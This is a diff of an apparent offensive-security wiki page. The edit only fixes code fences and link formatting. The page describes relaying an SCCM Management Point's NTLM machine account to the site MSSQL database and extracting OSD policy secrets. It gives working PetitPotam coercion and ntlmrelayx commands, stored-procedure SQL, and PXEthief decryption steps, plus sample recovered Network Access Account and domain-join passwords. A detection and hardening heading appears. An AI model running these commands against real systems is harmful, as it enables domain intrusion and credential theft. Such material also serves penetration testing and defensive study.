@@ -1,6 +1,5 @@
 # SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction
 
-
 ## TL;DR
 By coercing a **System Center Configuration Manager (SCCM) Management Point (MP)** to authenticate over SMB/RPC and **relaying** that NTLM machine account to the **site database (MSSQL)** you obtain `smsdbrole_MP` / `smsdbrole_MPUserSvc` rights.  These roles let you call a set of stored procedures that expose **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables, etc.).  The blobs are hex-encoded/encrypted but can be decoded and decrypted with **PXEthief**, yielding plaintext secrets.
 
@@ -32,7 +31,7 @@ Grab the GUIDs that will act as the **clientID** for later DB queries:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
-```
+
 ---
 
 ## 2. Relay the MP machine account to MSSQL
@@ -44,12 +43,12 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
        -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-```When the coercion fires you should see something like:
+When the coercion fires you should see something like:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
 ```
-```
+
 ---
 
 ## 3. Identify OSD policies via stored procedures
@@ -57,7 +56,7 @@ Connect through the SOCKS proxy (port 1080 by default):
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
-```Switch to the **CM_<SiteCode>** DB (use the 3-digit site code, e.g. `CM_001`).
+Switch to the **CM_<SiteCode>** DB (use the 3-digit site code, e.g. `CM_001`).
 
 ### 3.1  Find Unknown-Computer GUIDs (optional)
 ```sql
@@ -66,12 +65,12 @@ SELECT SMS_Unique_Identifier0
 FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
-```
+
 ### 3.2  List assigned policies
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
-```Each row contains `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.
+Each row contains `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.
 
 Focus on policies:
 * **NAAConfig**  – Network Access Account creds
@@ -83,7 +82,7 @@ If you already have `PolicyID` & `PolicyVersion` you can skip the clientID requi
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-```> IMPORTANT: In SSMS increase “Maximum Characters Retrieved” (>65535) or the blob will be truncated.
+> IMPORTANT: In SSMS increase “Maximum Characters Retrieved” (>65535) or the blob will be truncated.
 
 ---
 
@@ -95,14 +94,14 @@ echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
 # Decrypt with PXEthief (7 = decrypt attribute value)
 python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
 ```
-```Recovered secrets example:
+Recovered secrets example:
 ```
 OSDJoinAccount : CONTOSO\\joiner
 OSDJoinPassword: SuperSecret2025!
 NetworkAccessUsername: CONTOSO\\SCCM_NAA
 NetworkAccessPassword: P4ssw0rd123
 ```
-```
+
 ---
 
 ## 5. Relevant SQL roles & procedures
@@ -127,7 +126,7 @@ JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
 WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
   AND  pe.permission_name='EXECUTE';
 ```
-```
+
 ---
 
 ## 6. Detection & Hardening
@@ -148,9 +147,8 @@ WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
   
 [[abusing-ad-mssql.md]]
 
-
 ## References
-- [[https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/|I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays]]
-- [[https://github.com/MWR-CyberSec/PXEThief|PXEthief]]
-- [[https://github.com/subat0mik/Misconfiguration-Manager|Misconfiguration Manager – ELEVATE-4 & ELEVATE-5]]
+- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
+- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
 
